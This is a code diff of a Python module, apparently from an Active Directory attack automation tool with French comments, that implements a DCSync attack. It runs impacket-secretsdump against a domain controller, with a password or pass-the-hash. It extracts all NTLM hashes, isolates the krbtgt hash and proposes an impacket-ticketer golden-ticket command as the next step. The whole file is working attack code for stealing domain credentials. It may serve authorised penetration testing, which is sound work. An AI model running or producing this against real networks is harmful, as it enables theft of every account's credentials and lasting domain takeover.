@@ -1,70 +1,111 @@
+# strategies/dc_sync.py
+
 import subprocess
-from entities.edge import Edge
+from dataclasses import dataclass
+
 from .exploit_strategy import ExploitStrategy
+from entities.edge import Edge
+from entities.node import Node
+from entities.node_kind import NodeKind
+from entities.exploit_result import ExploitResult
+from entities.edge_kind import EdgeKind
+from entities.credentials import Credential
+from exceptions.hop_failed_error import HopFailedError
+from services.printing import print_check, print_done
+from references.cred_store import enrich_creds
 
 
+@dataclass
 class DCSyncStrategy(ExploitStrategy):
-    """
-    DCSync — Réplication de l'annuaire AD.
-    Dump tous les hashes NTLM du domaine incluant krbtgt.
+    edge: Edge
 
-    FIX:
-    - Méthode principale : impacket-secretsdump -just-dc (fiable, pas de -outputfile)
-    - Méthode bloodyAD supprimée : bloodyAD ne supporte pas le dump direct de unicodePwd
-      via une commande unique — cette opération nécessite secretsdump.
-    """
+    @property
+    def attacker(self) -> Node:
+        return self.edge.source_node
 
-    def describe(self, edge: Edge) -> str:
-        return (
-            f"[DCSync] {edge.source_node.label} peut répliquer l'AD "
-            f"→ dump de tous les hashes NTLM du domaine (krbtgt inclus)"
+    @property
+    def target(self) -> Node:
+        return self.edge.goal_node
+
+    # ── Interface ExploitStrategy ─────────────────────────────────────────────
+
+    def can_exploit(self) -> bool:
+        return self.edge.kind in (EdgeKind.DCSYNC, EdgeKind.GET_CHANGES_ALL)
+
+    def exploit(self, creds: dict) -> ExploitResult:
+        creds = {**creds, "username": self.attacker.sam()}
+        creds = enrich_creds(creds)
+
+        print_check(
+            f"DCSync: {self.attacker.label} ──▶ {self.target.label}"
         )
 
-    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
-        return self._run_secretsdump(username, password, domain, dc_ip)
+        return self._run_secretsdump(creds)
 
-    # ── helper ───────────────────────────────────────────────────────────────
+    # ── Technique ─────────────────────────────────────────────────────────────
 
-    def _run_secretsdump(self, username: str, password: str, domain: str, dc_ip: str) -> dict:
-        # FIX: pas de -outputfile → stdout contient tous les hashes
-        # -just-dc = mode DCSync uniquement (pas de dump SAM/LSA)
-        cmd = [
-            "impacket-secretsdump",
-            f"{domain}/{username}:{password}@{dc_ip}",
-            "-just-dc",
-        ]
+    def _run_secretsdump(self, creds: dict) -> ExploitResult:
+        dc_ip    = creds["dc_ip"]
+        domain   = creds["domain"]
+        username = creds["username"]
+        secret   = creds.get("secret", "")
+        hashes   = creds.get("hashes")          # LM:NT si PTH
+
+        if hashes:
+            target = f"{domain}/{username}@{dc_ip}"
+            cmd = ["impacket-secretsdump", target, "-just-dc", "-hashes", hashes]
+        else:
+            target = f"{domain}/{username}:{secret}@{dc_ip}"
+            cmd = ["impacket-secretsdump", target, "-just-dc"]
 
         try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            output = result.stdout + result.stderr
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            output = proc.stdout + proc.stderr
+        except subprocess.TimeoutExpired:
+            raise HopFailedError(self.edge, "secretsdump timeout (60s)")
+        except FileNotFoundError:
+            raise HopFailedError(self.edge, "impacket-secretsdump introuvable dans le PATH")
 
-            # Format : domaine\user:RID:LMhash:NThash:::
-            hashes = [
-                line.strip()
-                for line in output.splitlines()
-                if ":::" in line and not line.startswith("[")
-            ]
+        # Format : DOMAIN\user:RID:LMhash:NThash:::
+        all_hashes = [
+            line.strip()
+            for line in output.splitlines()
+            if ":::" in line and not line.startswith("[")
+        ]
 
-            # krbtgt = preuve de compromission totale du domaine
-            krbtgt_hash = next(
-                (h for h in hashes if "krbtgt" in h.lower()),
-                None,
+        krbtgt_line = next(
+            (h for h in all_hashes if "krbtgt" in h.lower()), None
+        )
+
+        if not krbtgt_line:
+            raise HopFailedError(
+                self.edge,
+                f"secretsdump ran but krbtgt not found — output:\n{output}"
             )
 
-            success = krbtgt_hash is not None
+        nt_hash = krbtgt_line.split(":")[3] if krbtgt_line.count(":") >= 3 else ""
 
-            return {
-                "success": success,
-                "output":  output,
-                "credentials": {
-                    "type":        "dcsync",
-                    "method":      "secretsdump -just-dc",
-                    "krbtgt_hash": krbtgt_hash,
-                    "all_hashes":  hashes,
-                } if success else None,
-            }
+        print_done(f"DCSync OK — krbtgt NT hash: {nt_hash}")
 
-        except subprocess.TimeoutExpired:
-            return {"success": False, "output": "Timeout (60s)", "credentials": None}
-        except FileNotFoundError:
-            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}
+        return ExploitResult(
+            technique="DCSync (secretsdump -just-dc)",
+            edge=self.edge,
+            success=True,
+            notes=(
+                f"Domaine compromis — krbtgt récupéré\n"
+                f"  krbtgt hash : {krbtgt_line}\n"
+                f"  Total hashes: {len(all_hashes)}"
+            ),
+            next_command=(
+                f"impacket-ticketer -nthash {nt_hash} "
+                f"-domain {creds['domain']} "
+                f"-domain-sid <SID> Administrator"
+            ),
+            cleanup_command="# Réinitialiser le mot de passe krbtgt 2× dans l'AD",
+            gained_access=Credential(
+                username="krbtgt",
+                password=None,
+                domain=creds.get("domain"),
+                dc_ip=creds.get("dc_ip"),
+            ),
+        )
